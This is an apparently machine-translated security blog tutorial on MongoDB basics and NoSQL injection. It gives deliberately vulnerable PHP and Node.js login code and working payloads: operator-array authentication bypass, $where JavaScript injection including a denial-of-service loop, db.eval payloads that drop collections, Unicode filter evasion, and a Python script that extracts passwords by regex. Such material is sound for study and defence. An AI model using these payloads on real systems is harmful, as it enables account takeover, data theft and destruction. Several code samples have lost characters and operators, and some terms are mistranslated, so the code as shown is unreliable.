#Database Safe Learning—NoSQL

Author: H3rmesk1t

Data: 2021.09.17

# Basic concepts
## NoSQL
- Nosql, not only SQL, is a huge amount of data generated on the network every day on modern computing systems, and a large part of this data is processed by the relational database management system (RDBMS); through application practice, the relational model is very suitable for client server programming, far exceeding the expected benefits. Today it is the dominant technology for structured data storage in network and business applications.
- At the same time, NoSQL is a new revolutionary database movement. It was proposed in the early days that the trend was growing higher by 2009. NoSQL advocates advocate the use of non-relational data storage. Compared with the overwhelming application of relational databases, this concept is undoubtedly an injection of a new mindset.

## MongoDB
- MongoDB is a NoSQL database. It is an open source database system based on distributed file storage written in C++. It aims to provide a scalable high-performance data storage solution for web applications. In the case of high load, adding more nodes can ensure server performance.

## Memcached
- Memcached is an open source, high-performance, high-concurrency distributed memory cache system written in C language

## Redis
- Redis is a high-performance key-value database

# MongoDB Preliminary
## Analysis of basic concepts of MongoDB
- MongoDB stores data as a document, and the data structure consists of key value (key=>value) pairs. MongoDB documents are similar to JSON objects. Field values ​​can contain other documents, arrays and document arrays.

````sql
{
	"_id" : ObjectId("60fa854cf8aaaf4f21049148"),
	"name" : "whoami",
	"description" : "the admin user",
	"age" : 20,
	"status" : "D",
	"groups" : [
		"admins",
		"users"
	]
}
```
|SQL Concept | MongoDB Concept | Description |
|--|--|--|--|
| database | database | database |
|tables|collection|database table/collection|
|row|document|data record row/document|
|column|field|data fields/domain|
|index|index|index|
|tables joins||Table connection, MongoDB does not support|
|primary key|primary key|primary key, MongoDB automatically sets the `_id` field to the primary key|

### Database
- Multiple databases can be created in one MongoDB. A single instance of MongoDB can accommodate multiple independent databases, each with its own collection and permissions, and different databases are also placed in different files.

- Use `show dbs` to display a list of all databases
- Use `db` to display the current database object or collection

![Insert the picture description here](https://img-blog.csdnimg.cn/5f6eb6bafc804ce5b24d4b5423b2884e.png#pic_center)

### Document (Document)
- Documents are a set of key-value pairs, similar to a row in an RDBMS relational database. MongoDB's documents do not need to set the same fields, and the same fields do not require the same data type. This is very different from relational databases and is also a very prominent feature of MongoDB, for example

````sql
{"username":"H3rmesk1t","password":"flag{ef5b8877-c871-4832-8c88-57dd2397a04c}"}
```

### Collection
- Collections are MongoDB document groups, similar to tables in the RDBMS relational database management system. Collections exist in the database, and collections do not have a fixed structure, which means that different formats and types of data can be inserted into the collections, for example,

````sql
{"username":"H3rmesk1t"}
{"username":"H3rmesk1t","password":"flag{ef5b8877-c871-4832-8c88-57dd2397a04c}"}
{"username":"H3rmesk1t","password":"flag{ef5b8877-c871-4832-8c88-57dd2397a04c}","ways":["Misc","Web"]}
```
- Collections are automatically created when inserting documents
- You can use the `show collections` or `show tables` command to view existing collections

![Insert the image description here](https://img-blog.csdnimg.cn/2757bbbba9d64886ae5e785b5242d961.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
## MongoDB basic syntax analysis
### MongoDB Creates a Database
- MongoDB The command to create a database is: `use DATABASE_NAME`. The database will be automatically created when the database does not exist; when the database exists, it will switch to the specified database.

![Insert the picture description here](https://img-blog.csdnimg.cn/9da0d0b650534d829baf0ce4ed3485d4.png#pic_center)
### MongoDB Create Collection
- Use the method of `createCollection` to create a collection, with the command `db.createCollection(name, options)`, where `name` is the name of the collection to be created, and `options` is an optional parameter to specify options for memory size and index

![Insert the picture description here](https://img-blog.csdnimg.cn/cb2df577dba44e518a15ae6ace11117c.png#pic_center)
### MongoDB Insert Documents
- Use the `insert` method to insert a document into the collection, with the command `db.COLLECTION_NAME.insert(document)`

![Insert the picture description here](https://img-blog.csdnimg.cn/456c697f303c445393c241c192d9bea8.png#pic_center)
### MongoDB updates documentation
- Use the `update` or `save` method to update documents in the collection

#### update method
````sql
db.collection.update(
   <query>,
   <update>,
   {
     upsert: <boolean>,
     multi: <boolean>,
     writeConcern: <document>
   }
)

Parameter description:
query: query conditions for update operation, similar to the content after the where clause in the sql update statement
update: The object of the update operation and some updated operators (such as $set), etc., can be understood as the content after the set keyword in the sql update statement
multi: optional, the default is false, only the first record found is updated. If this parameter is true, all the records found according to the conditions will be updated.
```
![Insert the picture description here](https://img-blog.csdnimg.cn/5f3bf5b6c4d645ecb9f7b89fd92d4e25.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
- Modify multiple identical documents, you need to set the multi parameter to true

````sql
db.person.update({'usernmae':'admin'},{$set:{'username':'H3rmesk1t'}},{multi:true})
```
#### save method
- The `save` method replaces the existing document through the passed in document. The `_id` primary key will be updated if it exists, and if it does not exist, it will be inserted.

````sql
db.collection.save(
   <document>,
   {
     writeConcern: <document>
   }
)

Parameter description:
document: document data
```
![Insert the image description here](https://img-blog.csdnimg.cn/289e31d671a343b395d3502baa17bfd9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
### MongoDB query document
- Use the `find` method to query documents,
The `find` method displays all documents in an unstructured way
- If you need to read data in a readable way, you can use the `pretty` method to display all documents in a formatted manner

````sql
db.collection.find(query, projection)

Parameter description:
query: optional, use the query operator to specify the query conditions, which is equivalent to the where clause in the sql select statement
projection: optional, use the projection operator to specify the returned key
```
![Insert the image description here](https://img-blog.csdnimg.cn/3911e06d66ed4519ae9f1eea2c24a047.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
### Comparison of MongoDB and RDBMS Where statements
|Operation|Format|Statement|RDBMS Similar Statement|
|--|--|--|--|--|
| = |{< key >:< value >} |db.person.find({'username':'admin'}).pretty()|where name = 'admin'|
|<|{< key >:{$lt:< value >}}|db.person.find({'age':'{$lt:20}}).pretty()|where age < 20|
|<=|{< key >:{$lte:< value >}}|db.person.find({'age':'{$lte:20}}).pretty()|where age <= 20|
|>|{< key >:{$gt:< value >}}|db.person.find({'age':'{$gt:20}}).pretty()|where age 20|
|>=|{< key >:{$gte:< value >}}|db.person.find({'age':'{$gte:20}}).pretty()|where age >= 20|
|!=|{< key >:{$ne:< value >}}|db.person.find({'age':'{$ne:20}}).pretty()|where age != 20|

### MongoDB AND Conditions
- The `find` method in MongoDB can pass in multiple key-value pairs, each separated by a comma, that is, the AND condition of regular SQL, similar to the WHERE statement in RDBMS: `WHERE username='H3rmesk1t' AND password='flag{ec5e5cea-e23d-4ad7-b3fc-18c6236bc3ee}'`

![Insert the picture description here](https://img-blog.csdnimg.cn/c170fe0b99974b4390a6ad236b7656a9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
### MongoDB OR Conditions
- MongoDB OR conditional statement uses the keyword `$or` to represent it, and the command is as follows

````sql
db.collection.find(
   {
      $or: [
         {key1: value1}, {key2: value2}
      ]
   }
).pretty()
```
![Insert the image description here](https://img-blog.csdnimg.cn/0338f2f2aaa84073b6535049e5f9dd52.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
### AND and OR combined use
The following example demonstrates the use of AND and OR in combination, similar to the WHERE statement in RDBMS: `where age>19 AND (name='whoami' OR status='A')`

````sql
db.all_users.find({"age":{$gt:19}, $or: [{"name":"whoami"}, {"status":"A"}]})
{ "_id" : ObjectId("60fa9176f8aaaf4f21049150"), "name" : "whoami", "description" : "the admin user", "age" : 20, "status" : "A", "groups" : [ "admins", "users" ] }
```
# Introduction to Nosql injection
- Here we refer to OWASP's introduction to Nosql

```a
NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren’t using the traditional SQL syntax. Because these NoSQL injection attacks may execute within a procedural language, rather than in the declarative SQL language, the potential impacts are greater than traditional SQL injection.

NoSQL database calls are written in the application’s programming language, a custom API call, or formatted according to a common convention (such as XML, JSON, LINQ, etc). Malicious input targeting those specifications may not trigger the primary application sanitization checks. For example, filtering out common HTML special characters such as < & ; will not prevent attacks against a JSON API, where special characters include / { } :
```
![Insert the image description here](https://img-blog.csdnimg.cn/db81af044981477bb5ca5793f4866bee.jpg?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
- SQL injection allows an attacker to execute commands in SQL in the database. Unlike relational databases, NoSQL databases do not use a common query language. The NoSQL query syntax is product-specific. Queries are written in the application's programming language: PHP, JavaScript, Python, Java, etc. This will cause the attacker to execute commands not only in the database, but also in the application itself when a successful injection is performed.

# Classification of Nosql injection
- Classification by language: PHP array injection, JavaScript injection, Mongo Shell splicing injection, etc.
- Classification by attack mechanism: heavy-talk injection, joint query injection, JavaScript injection, blind injection, etc.

```a
Heavy words injection:
Also known as the ever-true form, this type of attack is to inject code into a conditional statement, so that the result of the generated expression judgment is always true, thereby bypassing the authentication or access mechanism.

Joint query injection:
Federation query is a well-known SQL injection technique where attackers use a fragile parameter to change the data set returned by a given query. The most common usage of joint query is to bypass the authentication page to get data

JavaScript Injection
MongoDB Server supports JavaScript, which makes it possible to perform complex transactions and queries in the data engine, but passing unclean user input into these queries can inject arbitrary JavaScript code, resulting in illegal data acquisition or tampering.
Blind
When the page does not echo, we can use the $regex regular expression to achieve the same function as the substr() function in traditional SQL injection, and NoSQL uses basically Boolean blind
```
# MongoDB injection in PHP
## heavy-talk injection
- Insert document data in MongoDB

![Insert the picture description here](https://img-blog.csdnimg.cn/65bd560b0ba147749fa5b70f3f07f34d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

- index.php content is as follows

```php
<?php
show_source();

$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
$username = $_POST['username'];
$password = $_POST['password'];

$query = new MongoDB\Driver\Query(array(
	'username' =$username,
	'password' =$password
));

$result = $manager->executeQuery('test.users', $query)->toArray();
$count = count($result);
if ($count 0) {
	foreach ($result as $user) {
		$user = ((array)$user);
		echo "Login Success".PHP_EOL;
		echo 'username:' . $user['username'].PHP_EOL;
		echo 'password:' . $user['password'].PHP_EOL;
	}
} else {
	echo 'Login Failed';
}
?>
```

- Simulated login admin user POST data
```a
username=admin&password=admin123
```
- After entering PHP, the data becomes
```php
array(
	'username' ='admin',
	'password' ='admin123'
)
```
- The query command executed after entering MongoDB is
````sql
db.users.find({'username':'admin', 'password':'admin123'})

{ "_id" : ObjectId("61445fbaa7a3dc15f3ac9c91"), "username" : "admin", "password" : "admin123" }
```
- From the above query code, we can see that there is no filtering and verification of the input. Here, we can use the `$ne` keyword to construct a permanent condition bypass to achieve Nosql injection

````sql
usernmae[$ne]=0&password[$ne]=0
```

![Insert the picture description here](https://img-blog.csdnimg.cn/9c3d555dd73b457daa4d8bd3e4c5a226.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

![Insert the picture description here](https://img-blog.csdnimg.cn/88e42bdebe6d443b91405454ab7fc57c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

- The query command executed after it is passed into MongoDB is

````sql
db.users.find({'username':{$ne:1}, 'password':{$ne:1}})

{ "_id" : ObjectId("61445fbaa7a3dc15f3ac9c91"), "username" : "admin", "password" : "admin123" }
{ "_id" : ObjectId("61445fd0a7a3dc15f3ac9c92"), "username" : "Gyan", "password" : "20080826" }
{ "_id" : ObjectId("61445fe1a7a3dc15f3ac9c93"), "username" : "guest", "password" : "guest" }
{ "_id" : ObjectId("61445fe7a7a3dc15f3ac9c94"), "username" : "demo", "password" : "demo" }
{ "_id" : ObjectId("61445ff9a7a3dc15f3ac9c95"), "username" : "Tom", "password" : "123456" }
```

- Since username and password in the users collection are not equal to 1, all document data will be queried
- From the PHP perspective, due to its own loose array characteristics, after sending data of `value[$ne]=1`, PHP will convert it into an array `value=array($ne=>1)`. After entering mongoDB, the previous single `{'value':1}` query becomes `{'value':{$ne:1}}` query

- Similar Payload, commonly used to verify whether the website exists. The first step in Nosql injection
````sql
username[$ne]=0&password[$ne]=0
username[$lt]=0&password[$lt]=0
username[$lte]=0&password[$lte]=0
username[$gt]=0&password[$gt]=0
username[$gte]=0&password[$gte]=0
```
## Joint query injection
- In popular database storage such as MongoDB, JSON query structure makes joint query injection attacks more complicated, but when the MongoDB query statement on the backend uses string splicing, Nosql already has the problem of joint query injection

````sql
string query = "{username:'" + $username + "', password:'" + $password + "'}"
```
- When entering the correct username and password to log in, the query statement is

````sql
{'usernmae':'admin', 'password':'admin123'}
```
- But since the input data is not filtered and verified well, the attacker can construct the following Payload to attack

````sql
username=admin', $or: [ {}, {'a': 'a&password='}], $comment: '123456
```
- After the backend is spliced, the statement is as follows. At this time, the query can be successful as long as the username is correct. This method is similar to SQL injection
- In this way, the original normal query statement will be converted to ignore the password. Log in to the user account directly without a password, because the conditions in () are always true

````sql
{'username':'admin', $or: [ {}, {'a': 'a', password:''}], $comment: '123456'}

select * from logins where username = 'admin' and (password true<or ('a'='a' and password = '')))
```
## JavaScript Injection

- MongoDB Server supports JavaScript. It can use JavaScript to perform some complex transactions and queries, and also allows JavaScript code to be executed during queries. However, if a user who passes unclear input into these queries, arbitrary JavaScript code may be injected, resulting in illegal data acquisition or tampering.

### $where operator
- Let's first understand the `$where` operator. In MongoDB, the `$where` operator can be used to execute JavaScript code, using strings of JavaScript expressions or JavaScript functions as part of the query statement. Before MongoDB 2.4, the `$where` operator can even access global functions and properties in Mongo Shell through the `$where` operator, such as db, which means that all the information of the database can be obtained in custom functions.

````sql
db.users.find({ $wh
ere: "function(){return(this.username == 'admin')}" })

{ "_id" : ObjectId("60fa9c80257f18542b68c4b9"), "username" : "admin", "password" : "admin123" }
```
- After using the `$where` keyword, JavaScript will execute and return "admin", and then query the data with username admin
- Some vulnerable PHP applications may directly insert unprocessed user input when building MongoDB queries, such as getting query conditions from `$username` in variables:
````sql
db.users.find({ $where: "function(){return(this.username == $username)}" })
```
- Then the attacker can inject malicious strings, such as `'d1no'; sleep(5000)`, and the query statement executed by MongoDB is
````sql
db.users.find({ $where: "function(){return(this.username == 'd1no'; sleep(5000))}" })
```
- If the server has a 5-second delay at this time, the injection is successful

- index.php content is as follows

```php
<?php
$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
$username = $_POST['username'];
$password = $_POST['password'];
$function = "
function() {
	var username = '".$username."';
	var password = '".$password."';
	if(username == 'admin' && password == 'admin123'){
		return true;
	}else{
		return false;
	}
}";
$query = new MongoDB\Driver\Query(array(
    '$where' =$function
));
$result = $manager->executeQuery('test.users', $query)->toArray();
$count = count($result);
if ($count 0) {
	foreach ($result as $user) {
		$user = ((array)$user);
		echo "Login Success".PHP_EOL;
		echo 'username:' . $user['username'].PHP_EOL;
		echo 'password:' . $user['password'].PHP_EOL;
	}
} else {
	echo 'Login Failed';
}
?>
```
#### Before MongoDB 2.4

- As shown below, after sending the following data, if there is an echo, all collection names in the current database will be obtained
````sql
username=1&password=1';(function(){return(tojson(db.getCollectionNames()))})();var a='1
```
#### After MongoDB 2.4
- After MongoDB 2.4, the db attribute cannot be accessed, but it should be possible to construct a universal password. If the following data are sent at this time
````sql
username=1&password=1';return true//
or
username=1&password=1';return true;var a='1
```
![Insert the picture description here](https://img-blog.csdnimg.cn/6e5e39a1dd2040c7bf5c10dad77a3deb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
- The PHP data processed in the backend is as follows

```php

array(
    '$where' ="
    function() {
		var username = '1';
		var password = '1';return true;var a='1';
		if(username == 'admin' && password == '123456'){
			return true;
		}else{
			return false;
		}
	}
")
```
- The query command executed in MongoDB is

````sql

db.users.find({$where: "function() { var username = '1';var password = '1';return true;var a='1';if(username == 'admin' && password == '123456'){ return true; }else{ return false; }}"})

{ "_id" : ObjectId("61445fbaa7a3dc15f3ac9c91"), "username" : "admin", "password" : "admin123" }
{ "_id" : ObjectId("61445fd0a7a3dc15f3ac9c92"), "username" : "Gyan", "password" : "20080826" }
{ "_id" : ObjectId("61445fe1a7a3dc15f3ac9c93"), "username" : "guest", "password" : "guest" }
{ "_id" : ObjectId("61445fe7a7a3dc15f3ac9c94"), "username" : "demo", "password" : "demo" }
{ "_id" : ObjectId("61445ff9a7a3dc15f3ac9c95"), "username" : "Tom", "password" : "123456" }
```

- It is not difficult to see from the above injection process that the `return true` in password causes the entire JavaScript code to end in advance and return true, successfully constructing a permanent true condition to bypass and complete Nosql injection.

- DOS class attack Payload
````sql
username=1&password=1';(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<5000); return Math.max();})();var a='1
```
### Command method injection
- MongoDB Driver generally provides methods to directly execute shell commands. These methods are generally not recommended, but it is inevitable that in order to implement some complex queries, people can execute JavaScript scripts through the `db.eval` method on the server side of MongoDB. For example, you can define a JavaScript function and then run it on the server side through `db.eval`

```php

<?php
$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
$username = $_POST['username'];

$cmd = new MongoDB\Driver\Command( [
    'eval' ="db.users.distinct('username',{'username':'$username'})"
] );

$result = $manager->executeCommand('test.users', $cmd)->toArray();
$count = count($result);
if ($count 0) {
    foreach ($result as $user) {
        $user = ((array)$user);
        echo '====Login Success====<br>';
        echo 'username:' . $user['username'] . '<br>';
        echo 'password:' . $user['password'] . '<br>';
    }
}
else{
    echo 'Login Failed';
}
?>
```
- Payload as follows

````sql
username=1'});db.users.drop();db.user.find({'username':'1
username=1'});db.users.insert({"username":"adm
in","password":123456"});db.users.find({'username':'1
```
## Boolean blind
- When the page does not echo, you can use the `$regex` regular expression to perform blind annotation. `$regex` can achieve the same functions as the `substr` function in traditional SQL injection

```php
<?php
show_source();

$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
$username = $_POST['username'];
$password = $_POST['password'];

$query = new MongoDB\Driver\Query(array(
    'username' =$username,
    'password' =$password
));

$result = $manager->executeQuery('test.users', $query)->toArray();
$count = count($result);
if ($count 0) {
    foreach ($result as $user) {
        $user = ((array)$user);
        echo '====Login Success====<br>';
        echo 'username:' . $user['username'] . '<br>';
        echo 'password:' . $user['password'] . '<br>';
    }
}
else{
    echo 'Login Failed';
}
?>
```
![Insert the image description here](https://img-blog.csdnimg.cn/2233fe56eee9410dbf4961d668342f90.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/9d6cb26455c64b6da4161c7b5ec408dc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

- You can log in successfully when `password[$regex]=.{8}`, but fail when `password[$regex]=.{9}`, indicating that the password length of the admin user is 6
- After knowing the length of password, you can extract password characters bit by bit

````sql
username=admin&password[$regex]=a.{7}
or
username=admin&password[$regex]=^a
```

- Nosql blind script

```python
import requests
import string

password = ''
url = 'http://127.0.0.1/html/demo.php'

While True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|', '#', '&', '$']:
            
            # When the method is GET
            get_payload = '?username=admin&password[$regex]=^%s' % (password + c)
            # When the method is POST
            post_payload = {
                "username": "admin",
                "password[$regex]": '^' + password + c
            }
            # When the method is POST with JSON
            json_payload = """{"username":"admin", "password":{"$regex":"^%s"}}""" % (password + c)
            #headers = {'Content-Type': 'application/json'}
            #r = requests.post(url=url, headers=headers, data=json_payload) # Simply send json
            
            r = requests.post(url=url, data=post_payload)
            if 'Login Success' in r.text:
                print("[+] %s" % (password + c))
                password += c
```
# MongoDB injection in Nodejs

- There is also a problem of MongoDB injection in Nodejs, which is mainly heavy-talk injection, and login bypass is achieved by constructing a permanently true password.

```javascript
server.js

var express = require('express');
var mongoose = require('mongoose');
var jade = require('jade');
var bodyParser = require('body-parser');

mongoose.connect('mongodb://localhost/test', { useNewUrlParser: true });
var UserSchema = new mongoose.Schema({
    name: String,
    username: String,
    password: String
});
var User = mongoose.model('users', UserSchema);
var app = express();

app.set('views', __dirname);
app.set('view engine', 'jade');

app.get('/', function(req, res) {
    res.render ("index.jade",{
        message: 'Please Login'
    });
});

app.use(bodyParser.json());

app.post('/', function(req, res) {
    console.log(req.body)
    User.findOne({username: req.body.username, password: req.body.password}, ​​function (err, user) {
        console.log(user)
        if (err) {
            return res.render('index.jade', {message: err.message});
        }
        if (!user) {
            return res.render('index.jade', {message: 'Login Failed'});
        }
        
        return res.render('index.jade', {message: 'Welcome back ' + user.name + '!'});
    });
});

var server = app.listen(8000, '0.0.0.0', function () {

    var host = server.address().address
    var port = server.address().port

    console.log("listening on http://%s:%s", host, port)
});

index.js

h1 #{message}
p #{message}
```

- Send payload in JSON format: `{"username":{"$ne":1},"password": {"$ne":1}}`
- When processing MongoDB queries, the JSON format is often used to send user-submitted data to the server
On the business side, if the target filters keywords such as `$ne`, you can use Unicode encoding to bypass it, because JSON can directly parse Unicode.

````sql
{"username":{"\u0024\u006e\u0065":1},"password": {"\u0024\u006e\u0065":1}}
// {"username":{"$ne":1},"password": {"$ne":1}}
```

# Nosql injection related tools
- [Project address](https://github.com/youngyangyang04/NoSQLAttack)

# Reference article
- [Article address](https://whoamianony.top/2021/07/30/Web%E5%AE%89%E5%85%A8/Nosql%20%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/)